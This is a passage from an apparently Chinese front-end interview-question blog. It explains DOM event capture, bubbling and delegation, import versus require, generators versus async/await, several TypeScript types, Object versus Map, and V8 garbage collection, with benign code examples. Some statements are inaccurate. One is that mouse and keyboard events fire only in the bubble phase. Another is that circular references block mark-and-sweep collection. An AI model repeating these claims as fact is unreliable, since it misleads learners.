元素上触发时，这个事件如何从文档根节点传播到目标元素，然后再从目标元素冒泡回文档根节点的过程。在DOM事件处理中，有两种主要的事件传播方式：冒泡事件和捕获事件。它们的执行顺序如下：</p><ol><li><p><strong>捕获阶段（Capture Phase）：</strong> 事件从根元素（通常是<code>document</code>对象）向目标元素（触发事件的元素）传播的阶段。在这个阶段，事件从根元素向下逐级传播，直到达到目标元素。</p></li><li><p><strong>目标阶段（Target Phase）：</strong> 事件到达目标元素时触发，即在目标元素上执行事件处理程序。</p></li><li><p><strong>冒泡阶段（Bubble Phase）：</strong> 事件从目标元素开始，沿着DOM树向上冒泡传播，直到根元素。在这个阶段，事件可以被更上层的父元素捕获并触发相应的事件处理程序。</p></li></ol><p>执行顺序可以总结如下：</p><ul><li>事件首先进入捕获阶段，从根元素向下传播到目标元素。</li><li>事件触发目标阶段，执行目标元素上的事件处理程序。</li><li>事件然后进入冒泡阶段，从目标元素向上冒泡传播到根元素。</li></ul><p>在实际开发中，通常我们将事件处理程序绑定在目标元素上，因此大部分情况下我们更关心捕获阶段和冒泡阶段是否会被触发。可以使用 <code>addEventListener</code> 方法的第三个参数来控制事件的传播方式：</p><ul><li>如果设置为 <code>true</code>，事件在捕获阶段执行。</li><li>如果设置为 <code>false</code>，事件在冒泡阶段执行（默认值）。</li></ul><p>例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">element.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, handler, <span class="hljs-literal">true</span>); <span class="hljs-comment">// 捕获阶段执行</span><br>element.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, handler, <span class="hljs-literal">false</span>); <span class="hljs-comment">// 冒泡阶段执行</span><br></code></pre></td></tr></table></figure><p>需要注意的是，并不是所有的事件都支持捕获阶段。一些事件，如鼠标事件和键盘事件，通常只在冒泡阶段触发。</p><h5 id="事件委托"><a href="#事件委托" class="headerlink" title="事件委托"></a>事件委托</h5><p>事件委托（Event delegation）是一种 JavaScript 编程技巧，它利用事件冒泡机制来优化事件处理程序的性能。通过事件委托，你可以将事件处理程序绑定到一个父元素，而不是将事件处理程序绑定到多个子元素，从而减少了事件处理程序的数量，并提高了性能。</p><p>以下是事件委托的基本工作原理和优势：</p><ol><li><p><strong>工作原理</strong>：</p><ul><li>事件委托利用事件冒泡的特性，事件从子元素冒泡到父元素，然后再冒泡到更高级的祖先元素，最终到达文档根元素。</li><li>你可以将事件处理程序绑定到一个父元素（通常是最近的共同祖先），并在事件冒泡到父元素时检查事件的目标（<code>event.target</code>）来确定是哪个子元素触发了事件。</li><li>这样，你就可以在一个地方管理多个子元素的事件，而不必为每个子元素都绑定事件处理程序。</li></ul></li><li><p><strong>优势</strong>：</p><ul><li>减少事件处理程序的数量：通过将事件处理程序绑定到父元素，而不是每个子元素，可以减少代码中的事件处理程序数量，使代码更加简洁和可维护。</li><li>动态添加和删除元素：事件委托适用于动态添加或删除子元素的情况，因为无需重新绑定事件处理程序，而新的子元素也会继承事件处理。</li><li>提高性能：在大量子元素存在的情况下，事件委托可以提高性能，因为减少了事件处理程序的数量，避免了内存和性能开销。</li></ul></li></ol><p>以下是一个事件委托的示例，假设我们有一个列表，其中包含多个列表项，我们希望在点击任何列表项时弹出相应的文本内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myList&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Item 1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Item 2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Item 3<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Item 4<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Item 5<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 获取父元素</span><br><span class="hljs-keyword">const</span> myList = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;myList&#x27;</span>);<br><br><span class="hljs-comment">// 为父元素绑定事件处理程序</span><br>myList.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) &#123;<br>  <span class="hljs-comment">// 检查事件目标是否是列表项</span><br>  <span class="hljs-keyword">if</span> (event.<span class="hljs-property">target</span>.<span class="hljs-property">tagName</span> === <span class="hljs-string">&#x27;LI&#x27;</span>) &#123;<br>    <span class="hljs-comment">// 弹出列表项的文本内容</span><br>    <span class="hljs-title function_">alert</span>(event.<span class="hljs-property">target</span>.<span class="hljs-property">textContent</span>);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>在这个示例中，我们将点击事件处理程序绑定到父元素 <code>myList</code> 上，并通过检查事件目标的标签名来确定点击的是哪个列表项。这样，无论有多少个列表项，我们都可以在一个地方管理点击事件，而不必为每个列表项单独绑定事件处理程序。这提高了代码的可维护性和性能。</p><h3 id="24、JS中import和require区别"><a href="#24、JS中import和require区别" class="headerlink" title="24、JS中import和require区别"></a>24、JS中import和require区别</h3><p><code>import</code> 和 <code>require</code> 都是 JavaScript 中用于导入模块的关键字，但它们有一些重要的区别，主要涉及到模块系统的不同和语法：</p><ol><li>模块系统的不同：</li></ol><ul><li><code>import</code> 是 ECMAScript 6 (ES6) 中引入的模块系统的一部分，它是 JavaScript 的官方标准，逐渐成为主流的模块导入方式。</li><li><code>require</code> 是 Node.js 中使用的 CommonJS 模块系统的一部分，它是 Node.js 特有的模块导入方式。</li></ul><ol start="2"><li>语法的不同：</li></ol><ul><li><code>import</code> 使用 ES6 的模块导入语法，它采用了类似于 <code>import &#123; module &#125; from &#39;module&#39;</code> 或 <code>import module from &#39;module&#39;</code> 的语法，可以实现按需导入和默认导入。</li><li><code>require</code> 使用 CommonJS 的模块导入语法，它采用了 <code>require(&#39;module&#39;)</code> 的语法，不支持 ES6 的模块语法特性。</li></ul><ol start="3"><li>执行时机的不同：</li></ol><ul><li><code>import</code> 是编译时加载，意味着模块在代码执行前就已经加载和解析完毕。这可以帮助提前发现模块的语法错误。</li><li><code>require</code> 是运行时加载，模块在代码执行时才会加载和执行，这意味着在运行时可能会发生模块加载的错误。</li></ul><ol start="4"><li>浏览器支持的不同：</li></ol><ul><li><code>import</code> 是 ES6 的一部分，浏览器对它的支持逐渐增加，但并不是所有浏览器都支持。为了在浏览器中使用 <code>import</code>，通常需要使用工具如 Babel 进行转译。</li><li><code>require</code> 是 Node.js 的一部分，不适用于浏览器环境，除非使用 Browserify 或 webpack 等工具进行构建。</li></ul><p>总结：</p><ul><li>在 Node.js 环境中，你应该使用 <code>require</code>。</li><li>在现代的前端开发中，尤其是使用 ES6 模块语法的情况下，应该使用 <code>import</code>。</li><li>如果需要在浏览器中使用 <code>import</code>，通常需要借助构建工具进行转译和打包。</li></ul><h3 id="26、genertor和async区别"><a href="#26、genertor和async区别" class="headerlink" title="26、genertor和async区别"></a>26、genertor和async区别</h3><p>Generator 和 async&#x2F;await 都是 JavaScript 中用于处理异步操作的机制，但它们之间有一些重要的区别。</p><ol><li><p><strong>语法和用法：</strong></p><ul><li>Generator 使用 <code>function*</code> 声明，并使用 <code>yield</code> 关键字来产生值。通过调用 Generator 函数，可以生成一个迭代器对象，然后可以通过迭代器的 <code>.next()</code> 方法来逐步执行 Generator 函数内部的代码。</li><li>async&#x2F;await 使用 <code>async</code> 和 <code>await</code> 关键字来声明和使用。通过将 <code>async</code> 关键字放在函数前面，可以将函数标记为异步函数，然后在异步函数内部使用 <code>await</code> 来等待异步操作的完成。</li></ul></li><li><p><strong>执行方式：</strong></p><ul><li>Generator 是手动控制迭代器的执行，需要显式调用 <code>.next()</code> 方法来推进执行。这可以用于实现自定义的控制流程，但也需要更多的手动操作。</li><li>async&#x2F;await 更像是一种更直观的异步编程方式，它以更类似同步代码的方式编写异步操作。在异步函数内部使用 <code>await</code> 关键字，它会暂停函数的执行，直到等待的异步操作完成，然后继续执行下一行代码。</li></ul></li><li><p><strong>返回值：</strong></p><ul><li>Generator 函数返回一个迭代器对象，通过迭代器的 <code>.next()</code> 方法可以获取每一步的返回值。</li><li>异步函数使用 <code>await</code> 关键字来等待异步操作完成，并且异步函数本身返回一个 Promise 对象，这个 Promise 对象的结果值是异步操作的返回值。</li></ul></li><li><p><strong>错误处理：</strong></p><ul><li>Generator 需要手动处理错误，可以在 Generator 函数内部使用 <code>try...catch</code> 来捕获错误，或者通过检查迭代器的 <code>done</code> 属性来判断是否发生了错误。</li><li>async&#x2F;await 使用 <code>try...catch</code> 来处理异步操作中的错误，更类似于同步代码的错误处理方式。</li></ul></li></ol><p>总之，Generator 和 async&#x2F;await 都是处理异步操作的有力工具，选择使用哪种方式取决于项目的需求和开发者的个人偏好。async&#x2F;await 更加直观和方便，适合大多数异步编程场景，而 Generator 则更适合需要自定义控制流程的情况。在实际开发中，你可能会根据具体的需求选择使用其中一种或两者结合使用。</p><h3 id="27、Ts中void和undefined区别"><a href="#27、Ts中void和undefined区别" class="headerlink" title="27、Ts中void和undefined区别"></a>27、Ts中void和undefined区别</h3><p>在 TypeScript 中，<code>void</code> 和 <code>undefined</code> 是两种不同的数据类型，它们有着不同的含义和用法。</p><ol><li><p><strong><code>void</code> 类型：</strong></p><ul><li><code>void</code> 表示没有返回值的函数的返回类型。通常用于函数声明或函数表达式中，表示该函数不返回任何值。</li><li>可以将 <code>void</code> 类型的变量赋值为 <code>undefined</code> 或 <code>null</code>，但不能赋值为其他类型的值。</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">logMessage</span>(<span class="hljs-params"></span>): <span class="hljs-built_in">void</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;This function doesn&#x27;t return anything.&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">let</span> <span class="hljs-attr">result</span>: <span class="hljs-built_in">void</span> = <span class="hljs-literal">undefined</span>; <span class="hljs-comment">// 合法</span><br>result = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 合法</span><br>result = <span class="hljs-number">42</span>; <span class="hljs-comment">// 错误，不能赋值为其他类型的值</span><br></code></pre></td></tr></table></figure></li><li><p><strong><code>undefined</code> 类型：</strong></p><ul><li><code>undefined</code> 是一个特殊的值，表示变量未初始化或不存在值。它是一个数据类型，同时也是一个全局对象的属性，表示全局的 undefined 值。</li><li>在 TypeScript 中，变量可以被显式声明为 <code>undefined</code> 类型，表示变量的值可以为 <code>undefined</code>。</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">let</span> <span class="hljs-attr">myVar</span>: <span class="hljs-literal">undefined</span> = <span class="hljs-literal">undefined</span>; <span class="hljs-comment">// 合法</span><br>myVar = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 合法</span><br>myVar = <span class="hljs-number">42</span>; <span class="hljs-comment">// 错误，不能赋值为其他类型的值</span><br></code></pre></td></tr></table></figure></li></ol><p>总结：</p><ul><li><code>void</code> 是一种函数返回值的类型，表示函数没有返回值。</li><li><code>undefined</code> 是一种特殊的值，表示变量未初始化或不存在值，它也是一个数据类型。</li><li>在使用 <code>void</code> 时，通常是为了标识函数的副作用（如输出日志），而不是为了返回值。</li><li>在使用 <code>undefined</code> 时，通常是为了表示变量的初始状态或可能的空值。</li></ul><h3 id="28、Ts中never介绍"><a href="#28、Ts中never介绍" class="headerlink" title="28、Ts中never介绍"></a>28、Ts中never介绍</h3><p>在 TypeScript 中，<code>never</code> 是一个特殊的数据类型，通常表示在任何情况下都不会出现的值。<code>never</code> 类型主要有以下几种常见用法：</p><ol><li><p><strong>函数返回值类型：</strong></p><ul><li>当一个函数永远不会返回结果（例如，函数内部抛出异常或者无限循环）时，可以将其返回类型标记为 <code>never</code>。</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">throwError</span>(<span class="hljs-params">message: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">never</span> &#123;<br>  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(message);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">infiniteLoop</span>(<span class="hljs-params"></span>): <span class="hljs-built_in">never</span> &#123;<br>  <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>    <span class="hljs-comment">// 无限循环，永远不会结束</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>抛出异常：</strong></p><ul><li>当函数抛出异常时，它的返回类型可以标记为 <code>never</code>。</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">throwError</span>(<span class="hljs-params">message: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">never</span> &#123;<br>  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(message);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>类型保护：</strong></p><ul><li>在 TypeScript 中，<code>never</code> 类型通常与类型保护结合使用，以确保某些条件下变量的类型永远不会是某个特定类型。</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">assertNever</span>(<span class="hljs-params">x: <span class="hljs-built_in">never</span></span>): <span class="hljs-built_in">never</span> &#123;<br>  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Unexpected object: &quot;</span> + x);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">processValue</span>(<span class="hljs-params">value: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span></span>) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value === <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>    <span class="hljs-comment">// 处理字符串</span><br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value === <span class="hljs-string">&quot;number&quot;</span>) &#123;<br>    <span class="hljs-comment">// 处理数字</span><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_">assertNever</span>(value); <span class="hljs-comment">// 抛出错误，因为 value 的类型是 never</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>总之，<code>never</code> 类型在 TypeScript 中用于表示不会出现的值或情况，它通常用于函数的返回类型，异常处理以及类型保护。当你标记一个函数返回类型为 <code>never</code> 时，你在告诉 TypeScript 这个函数将永远不会正常返回，从而帮助编译器更好地检查代码。</p><h3 id="29、Ts中readonly和const区别"><a href="#29、Ts中readonly和const区别" class="headerlink" title="29、Ts中readonly和const区别"></a>29、Ts中readonly和const区别</h3><p>在 TypeScript 中，<code>readonly</code> 和 <code>const</code> 都用于创建不可修改的值，但它们之间有一些关键区别：</p><ol><li><p><strong><code>readonly</code> 关键字：</strong></p><ul><li><code>readonly</code> 是 TypeScript 中的一个关键字，通常用于对象的属性和类的实例属性上。</li><li>当一个属性被标记为 <code>readonly</code> 时，它表示这个属性只能在对象创建时或构造函数内赋值，之后不可修改。</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Point</span> &#123;<br>  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>;<br>  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span>;<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-attr">point</span>: <span class="hljs-title class_">Point</span> = &#123; <span class="hljs-attr">x</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">2</span> &#125;;<br>point.<span class="hljs-property">x</span> = <span class="hljs-number">3</span>; <span class="hljs-comment">// 错误，x 属性是只读的</span><br></code></pre></td></tr></table></figure><ul><li><code>readonly</code> 也可以用于类的实例属性，类似于对象属性的行为，只能在构造函数内赋值。</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Alice&quot;</span>);<br>person.<span class="hljs-property">name</span> = <span class="hljs-string">&quot;Bob&quot;</span>; <span class="hljs-comment">// 错误，name 属性是只读的</span><br></code></pre></td></tr></table></figure></li><li><p><strong><code>const</code> 关键字：</strong></p><ul><li><code>const</code> 是 JavaScript 中的关键字，用于创建不可修改的常量。</li><li>在 TypeScript 中，<code>const</code> 主要用于创建具有字面量值的变量，例如字符串、数字、布尔值等。</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> name = <span class="hljs-string">&quot;Alice&quot;</span>;<br><span class="hljs-keyword">const</span> age = <span class="hljs-number">30</span>;<br><span class="hljs-keyword">const</span> isAdmin = <span class="hljs-literal">true</span>;<br></code></pre></td></tr></table></figure><ul><li><code>const</code> 声明的变量不能被重新赋值。</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> x = <span class="hljs-number">10</span>;<br>x = <span class="hljs-number">20</span>; <span class="hljs-comment">// 错误，x 是常量，不可重新赋值</span><br></code></pre></td></tr></table></figure><ul><li><code>const</code> 通常不直接用于对象属性，因为对象属性本身是引用类型，<code>const</code> 只保证引用不变，而不保证对象属性的值不变。</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> person = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Alice&quot;</span> &#125;;<br>person.<span class="hljs-property">name</span> = <span class="hljs-string">&quot;Bob&quot;</span>; <span class="hljs-comment">// 合法，修改了属性值，但没有修改引用</span><br></code></pre></td></tr></table></figure></li></ol><p>总结：</p><ul><li><code>readonly</code> 主要用于对象属性和类的实例属性，表示属性只读。</li><li><code>const</code> 主要用于创建不可修改的常量值，通常用于基本数据类型的变量。</li><li><code>readonly</code> 和 <code>const</code> 都有它们各自的用途，取决于你要创建的内容是不可修改的属性还是不可修改的常量值。</li></ul><h3 id="30、JS里面Obejct和Map有什么区别"><a href="#30、JS里面Obejct和Map有什么区别" class="headerlink" title="30、JS里面Obejct和Map有什么区别"></a>30、JS里面Obejct和Map有什么区别</h3><p>在 JavaScript 中，<code>Object</code> 和 <code>Map</code> 都是用于存储和操作数据的数据结构，但它们有一些重要的区别：</p><ol><li><p><strong>键的类型：</strong></p><ul><li><strong>Object：</strong> 在 <code>Object</code> 中，键必须是字符串或符号（Symbol）。如果尝试使用其他类型的键，它们会被自动转换为字符串。</li><li><strong>Map：</strong> 在 <code>Map</code> 中，键可以是任意数据类型，包括基本数据类型（如字符串、数字、布尔值）以及对象、函数等。</li></ul></li><li><p><strong>键的顺序：</strong></p><ul><li><strong>Object：</strong> 在 <code>Object</code> 中，键的顺序不是固定的，取决于 JavaScript 引擎的实现。通常情况下，键的顺序会遵循插入的顺序，但不是严格有序的。</li><li><strong>Map：</strong> 在 <code>Map</code> 中，键的顺序是严格有序的，即它们会按照插入的顺序保持不变。</li></ul></li><li><p><strong>键的个数：</strong></p><ul><li><strong>Object：</strong> 通过 <code>Object.keys(obj)</code>、<code>Object.values(obj)</code> 或 <code>Object.entries(obj)</code> 等方法可以获取对象 <code>obj</code> 中的键值对，但没有直接的方法获取键的个数。</li><li><strong>Map：</strong> <code>Map</code> 有 <code>size</code> 属性，可以直接获取键值对的个数。</li></ul></li><li><p><strong>迭代方式：</strong></p><ul><li><strong>Object：</strong> 要迭代对象的属性，通常需要使用 <code>for...in</code> 循环或 <code>Object.keys(obj).forEach(...)</code> 等方式。</li><li><strong>Map：</strong> <code>Map</code> 有内置的迭代器方法，如 <code>forEach</code>、<code>entries</code>、<code>keys</code> 和 <code>values</code> 等，用于方便地迭代键值对。</li></ul></li><li><p><strong>内存消耗：</strong></p><ul><li><strong>Object：</strong> 由于对象属性的内部实现可能导致一些额外的内存消耗，因此对于存储大量数据时，<code>Object</code> 可能会占用更多内存。</li><li><strong>Map：</strong> <code>Map</code> 的内存消耗通常较小，因为它是为了存储键值对而设计的。</li></ul></li></ol><p>通常情况下，如果需要存储简单的键值对数据并且不关心键的顺序，<code>Object</code> 是一个合适的选择。但如果需要保持键的顺序或键的类型不受限制，或者需要更丰富的迭代和操作功能，<code>Map</code> 可能更适合。选择使用哪种数据结构取决于具体的需求。</p><h3 id="31、"><a href="#31、" class="headerlink" title="31、"></a>31、</h3><h3 id="32、内存泄漏和浏览器垃圾回收机制"><a href="#32、内存泄漏和浏览器垃圾回收机制" class="headerlink" title="32、内存泄漏和浏览器垃圾回收机制"></a>32、内存泄漏和浏览器垃圾回收机制</h3><p>内存泄漏是指在应用程序中，不再需要使用的内存没有被正确释放或回收，导致内存占用不断增加，最终可能导致程序运行变慢、崩溃或消耗过多系统资源。浏览器垃圾回收机制是一种自动管理内存的系统，用于检测和回收不再使用的内存，以防止内存泄漏。</p><p>以下是关于内存泄漏和浏览器垃圾回收机制的重要信息：</p><p><strong>内存泄漏的常见原因：</strong></p><ol><li><p><strong>未释放引用：</strong> 当一个对象不再需要时，应该将其引用设置为 <code>null</code> 或让其超出作用域，以便垃圾回收器可以识别并回收该对象。</p></li><li><p><strong>循环引用：</strong> 如果两个或多个对象相互引用，而且这些对象都不再被外部引用，它们将无法被垃圾回收，因为它们仍然被引用着。</p></li><li><p><strong>定时器和事件监听器：</strong> 忘记清除不再需要的定时器或事件监听器可能导致内存泄漏，因为它们会保持对对象的引用。</p></li><li><p><strong>大量数据：</strong> 如果应用程序不断创建大量数据，但不及时清理或回收这些数据，将导致内存泄漏。</p></li></ol><p><strong>浏览器垃圾回收机制的工作原理：</strong></p><p>浏览器垃圾回收机制的主要任务是识别和回收不再被引用的对象，以释放内存。</p><ol><li><p><strong>引用计数法：</strong> 这是一种最简单的垃圾回收方法，它通过跟踪对象的引用次数来判断对象是否可回收。当引用计数减少到零时，对象被回收。然而，这种方法无法解决循环引用问题，因此现代浏览器不再采用引用计数法。</p></li><li><p><strong>标记-清除算法：</strong> 这是一种常见的垃圾回收算法。它从一个或多个根对象（通常是全局对象和当前执行上下文）开始，标记所有从根对象可达的对象，然后清除所有未标记的对象。这种方法可以有效地处理循环引用问题。</p></li><li><p><strong>分代回收：</strong> 浏览器将对象分为不同的代，通常分为新生代和老生代。新生代包含生命周期短的对象，老生代包含生命周期长的对象。垃圾回收器更频繁地检查新生代，较少检查老生代，以提高性能。</p></li><li><p><strong>增量回收：</strong> 为了避免在回收时阻塞主线程，浏览器可以采用增量回收策略，将垃圾回收工作分为多个步骤，逐步完成，以减少对用户体验的影响。</p></li></ol><p>开发者可以通过以下方式帮助防止内存泄漏：</p><ul><li>及时释放不再需要的引用。</li><li>避免不必要的全局变量。</li><li>使用闭包时小心循环引用。</li><li>注意清理定时器和事件监听器。</li><li>使用浏览器开发者工具来检查内存使用情况并分析潜在的内存泄漏问题。</li></ul><p>理解内存泄漏和浏览器垃圾回收机制对于构建高性能、可靠的 Web 应用程序至关重要。</p><h5 id="V8引擎的垃圾回收"><a href="#V8引擎的垃圾回收" class="headerlink" title="V8引擎的垃圾回收"></a>V8引擎的垃圾回收</h5><p>主要采用了两种算法来处理垃圾回收：分代收集（Generational Collection）和增量标记（Incremental Marking）。</p><ol><li>分代收集：V8将内存分为两个代：新生代（Young Generation）和老生代（Old Generation）。新生代中的对象存活时间较短，而老生代中的对象存活时间较长。新生代使用Scavenge算法进行垃圾回收，通常采用Cheney算法，将内存分为两个半区（From Space和To Space），每次垃圾回收时，会将存活的对象复制到To Space中，并清空From Space。当一个对象在新生代中经历了多次垃圾回收仍然存活时，会将其移动到老生代。</li><li>增量标记：老生代采用标记-清除（Mark-Sweep）算法进行垃圾回收。这种算法首先会标记所有可达的对象，然后清除所有未被标记的对象。为了避免在标记过程中产生长时间的停顿（Stop-The-World），V8采用了增量标记策略。这种策略将标记过程分为多个阶段，在每个阶段之间，JavaScript程序可以继续执行。这样可以降低垃圾回收对程序性能的影响。</li></ol><p>V8垃圾回收是对JavaScript垃圾回收策略的具体实现。它采用分代收集和增量标记两种算法，有效降低了垃圾回收对程序性能的影响。</p><h5 id="如何优化和减少垃圾回收的影响，从而提高应用性能？"><a href="#如何优化和减少垃圾回收的影响，从而提高应用性能？" class="headerlink" title="如何优化和减少垃圾回收的影响，从而提高应用性能？"></a>如何优化和减少垃圾回收的影响，从而提高应用性能？</h5><p>以下是一些建议和技巧来帮助优化和减少垃圾回收的影响：</p><ol><li><strong>避免全局变量</strong>：全局变量不会被垃圾回收，除非它们被设置为 <code>null</code>。只有在确实需要时才应该使用它们。</li><li><strong>使用对象池</strong>：对于频繁创建和销毁的对象（如在游戏或高性能应用中的实体），使用对象池可以重用对象而不是每次都创建新的对象。这可以避免频繁的垃圾回收。</li><li><strong>小心闭包</strong>：闭包可能会导致意外的引用，从而阻止对象被垃圾回收。确保你只在需要时使用闭包，并在不再需要它们时断开引用。</li><li><strong>手动释放大对象</strong>：对于大的数据结构或数组，如果你知道它们不再需要，可以手动将它们设置为 <code>null</code>，从而提前提示垃圾回收器。</li><li><strong>避免循环引用</strong>：确保对象之间没有循环引用，因为这可能导致它们无法被垃圾回收。</li><li><strong>使用弱引用</strong>：在合适的场景下，使用 <code>WeakMap</code> 或 <code>WeakSet</code> 可以让你存储对对象的引用，而不会阻止这些对象被垃圾回收。</li><li><strong>优化事件监听器</strong>：确保及时删除不再需要的事件监听器。未删除的事件监听器可能会导致内存泄漏。</li><li><strong>减少内存分配</strong>：减少动态创建对象、数组和闭包的频率可以帮助减少需要回收的垃圾量。</li><li><strong>使用浏览器开发者工具</strong>：浏览器提供的开发者工具（如 Chrome DevTools）可以帮助你监测和诊断内存使用情况和潜在的泄漏。</li><li><strong>考虑使用 WebAssembly</strong>：对于需要高性能和低延迟的应用，使用 WebAssembly 可能会帮助减少 JavaScript 的垃圾回收的影响，因为 WebAssembly 有自己的内存管理模型。</li></ol><h3 id="33、class关键字实现的原理"><a href="#33、class关键字实现的原理" 